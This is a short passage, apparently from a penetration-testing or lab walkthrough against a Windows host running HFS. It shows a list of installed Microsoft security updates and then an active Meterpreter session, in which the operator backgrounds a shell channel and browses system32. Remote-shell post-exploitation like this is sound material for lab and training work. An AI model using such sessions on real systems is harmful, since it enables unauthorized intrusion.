http://support.microsoft.com/?kbid=4566425  Security Update  KB4566425  7/15/2020    
http://support.microsoft.com/?kbid=4569753  Update           KB4569753  8/12/2020    
http://support.microsoft.com/?kbid=4571703  Security Update  KB4571703  8/12/2020
```

```
C:\hfs>^Z
Background channel 2? [y/N]  y
meterpreter > cd c:\\
meterpreter > cd windows
meterpreter > cd system32
meterpreter > cat eula.txt
[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
```



